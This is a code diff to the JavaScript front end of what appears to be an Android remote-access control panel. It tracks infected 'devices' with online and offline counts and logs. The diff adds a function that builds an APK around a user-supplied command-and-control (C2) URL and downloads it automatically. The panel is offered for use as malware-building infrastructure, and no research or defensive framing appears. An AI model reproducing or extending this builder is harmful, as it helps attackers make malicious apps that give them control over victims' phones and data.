@@ -42,8 +42,10 @@ const DevicesManager = {
     },
     toggleSelectAll() {
         const master = document.getElementById('selectAllCheckbox');
-        document.querySelectorAll('.device-checkbox').forEach(cb => cb.checked = master.checked);
-        this.updateSelection();
+        if (master) {
+            document.querySelectorAll('.device-checkbox').forEach(cb => cb.checked = master.checked);
+            this.updateSelection();
+        }
     },
     filter() { this.load(); }
 };
@@ -71,9 +73,12 @@ const DeviceCountManager = {
     async update() {
         try {
             const data = await API.getDeviceCount();
-            document.getElementById('deviceCount').textContent = data.total;
-            document.getElementById('onlineCount').textContent = data.online;
-            document.getElementById('offlineCount').textContent = data.offline;
+            const total = document.getElementById('deviceCount');
+            const online = document.getElementById('onlineCount');
+            const offline = document.getElementById('offlineCount');
+            if (total) total.textContent = data.total;
+            if (online) online.textContent = data.online;
+            if (offline) offline.textContent = data.offline;
         } catch (err) { console.error('Error:', err); }
     }
 };
@@ -93,3 +98,65 @@ const TabsManager = {
         if (tab === 'logs') LogsManager.load();
     }
 };
+
+function buildApk() {
+    const apkName = document.getElementById('apkName').value.trim();
+    const appLabel = document.getElementById('appLabel').value.trim();
+    const c2Url = document.getElementById('c2Url').value.trim();
+    
+    if (!c2Url) {
+        alert('Please enter C2 URL');
+        return;
+    }
+    
+    const buildBtn = document.getElementById('buildBtn');
+    const statusDiv = document.getElementById('buildStatus');
+    const statusMsg = document.getElementById('statusMessage');
+    const buildLog = document.getElementById('buildLog');
+    const dinoSidebar = document.getElementById('dinoSidebar');
+    
+    buildBtn.disabled = true;
+    statusDiv.style.display = 'block';
+    statusMsg.textContent = 'Building... Play while you wait!';
+    statusMsg.style.color = '#fff';
+    buildLog.textContent = 'Starting Gradle build...\n';
+    
+    // Open Dino Sidebar
+    dinoSidebar.classList.add('active');
+    
+    fetch('api/build.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ apkName, appLabel, c2Url })
+    })
+    .then(async res => {
+        const text = await res.text();
+        try { return JSON.parse(text); } catch(e) { throw new Error(text); }
+    })
+    .then(data => {
+        buildBtn.disabled = false;
+        buildLog.textContent = data.log || '';
+        dinoSidebar.classList.remove('active');
+        
+        if (data.success) {
+            statusMsg.textContent = 'Build successful! Downloading...';
+            statusMsg.style.color = 'var(--success)';
+            // Auto download
+            const a = document.createElement('a');
+            a.href = data.downloadUrl;
+            a.download = data.downloadUrl;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        } else {
+            statusMsg.textContent = 'Build failed.';
+            statusMsg.style.color = 'var(--error)';
+        }
+    })
+    .catch(err => {
+        buildBtn.disabled = false;
+        dinoSidebar.classList.remove('active');
+        statusMsg.textContent = 'Error occurred.';
+        buildLog.textContent += '\n' + err.message;
+    });
+}
